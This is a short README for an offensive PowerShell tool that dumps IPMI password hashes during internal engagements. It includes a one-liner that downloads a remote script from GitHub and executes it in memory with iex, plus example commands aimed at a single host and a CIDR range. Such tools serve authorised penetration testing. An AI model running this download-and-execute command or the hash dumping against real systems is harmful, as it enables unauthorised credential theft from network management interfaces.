## About

Simple ported script to perform IPMI password hash dumping using PowerShell for internal engagements.
The script uses the default port however this can be changed using the `-Port` parameter.

CIDR ranges are also supported with a default user list for ease of use, single usernames or alternative user files can be specified with the `-Users` parameter.

## Load in memory

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-IPMIDump/refs/heads/main/Invoke-IPMIDump.ps1')
```

## Usage
```powershell
Invoke-IPMIDump -IP "10.10.1.1"
```
```powershell
Invoke-IPMIDump -IP "10.129.202.0/24"
```

